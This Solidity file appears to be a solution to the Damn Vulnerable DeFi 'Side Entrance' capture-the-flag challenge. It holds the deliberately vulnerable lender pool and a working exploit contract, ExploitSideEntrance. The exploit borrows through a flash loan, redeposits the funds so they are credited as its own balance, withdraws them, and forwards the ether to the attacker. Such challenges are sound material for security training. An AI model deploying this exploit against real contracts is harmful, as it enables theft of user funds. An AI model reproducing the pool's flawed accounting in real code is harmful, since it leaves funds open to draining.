
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}
 
contract ExploitSideEntrance{
    SideEntranceLenderPool thePool;
    address payable attacker;
    constructor(address _thePool){
        thePool = SideEntranceLenderPool(_thePool);
        attacker = payable(msg.sender);
    }

    function attack(uint256 amount) public {
        //call for a flashLoan() to borrow all the tokens in the lendingPool
        thePool.flashLoan(amount);
        //withdraw the tokens from the pool
        thePool.withdraw();

    }

    function execute() public payable {
        //The function called by the IFlashLoanEtherReceiver
        //Deposit the tokens back to the pool which updates the "balances" state variable
        thePool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        //transfer the tokens to the attacker address directly from the pool
        attacker.transfer(address(this).balance);
    }
}